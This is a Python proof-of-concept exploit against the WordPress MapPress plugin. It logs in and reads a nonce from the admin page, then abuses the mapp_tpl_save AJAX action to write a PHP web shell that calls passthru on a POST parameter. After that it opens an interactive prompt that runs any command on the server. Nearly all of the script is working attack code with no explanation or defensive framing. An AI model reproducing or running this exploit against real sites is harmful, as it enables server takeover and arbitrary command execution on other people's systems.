# Author : qerogram

import requests, os, hashlib

BASE_URL = "http://localhost:8000"
id = "wordpress"
pw = "wordpress"

def generateFileName() :
    sha1 = hashlib.sha1()
    sha1.update(os.urandom(32))
    return sha1.hexdigest()

def login(id, pw) :
    sess = requests.Session()
    sess.post(
        BASE_URL + "/wp-login.php",
        data = {
            'log': id,
            'pwd': pw,
            'wp-submit': '%EB%A1%9C%EA%B7%B8%EC%9D%B8',
            'testcookie': '1'
        }
    ).text
    
    return sess


def exploit(sess) :
    check = sess.get(
        BASE_URL + '/wp-admin/admin.php?page=mappress'
    ).text

    nonce = check[check.find('nonce":') + 8:]
    nonce = nonce[nonce.find('nonce":') + 8:]
    wp_nonce = nonce[:nonce.find('"')]
    FileName = generateFileName()[:20]

    res = sess.post(
        BASE_URL + "/wp-admin/admin-ajax.php",
        headers = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        # {
        #     "action" : "mapp_tpl_save",
        #     "mapdata" : '',
        #     "content" : "<?php+echo(passthru($_POST['qerogram']));?>",
        #     "name" : FileName,
        #     "nonce" : wp_nonce,
        # },
        data = f"action=mapp_tpl_save&mapdata=&nonce={wp_nonce}&name={FileName}&content=<?php+echo(passthru($_POST['qerogram']));?>"
    )
    return res.json()



def getShell(sess, res) :
    if res['status'] != "OK" :
        print("[+] Not Found Vulnerability")
        return

    data = res['data']
    data = data[data.find("/wp-content"):]

    while True :
        cmd = input("$ ")
        if cmd.lower() == "exit" or cmd.lower() == "quit"  : 
            break

        res = sess.post(
            BASE_URL + data,
            data = {"qerogram" : cmd}
        )
        print(res.text)

sess = login(id, pw)
res = exploit(sess)
getShell(sess, res)